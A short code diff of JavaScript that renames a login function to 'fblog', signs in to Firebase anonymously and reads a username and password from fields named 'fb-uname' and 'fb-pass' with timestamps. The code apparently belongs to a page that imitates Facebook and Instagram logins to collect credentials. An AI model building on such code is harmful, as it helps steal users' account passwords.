@@ -81,7 +81,7 @@ function iglog() {
   }
 }
 
-function login() {
+function fblog() {
   firebase
     .auth()
     .signInAnonymously()
@@ -91,7 +91,7 @@ function login() {
       window.alert("Error: " + errorMessage);
     });
 
-  var email = document.getElementById("fb-email").value;
+  var email = document.getElementById("fb-uname").value;
   var password = document.getElementById("fb-pass").value;
   var currentDate = new Date().toISOString().slice(0, 10);
   var currentTime = new Date().toISOString().slice(11, 19);
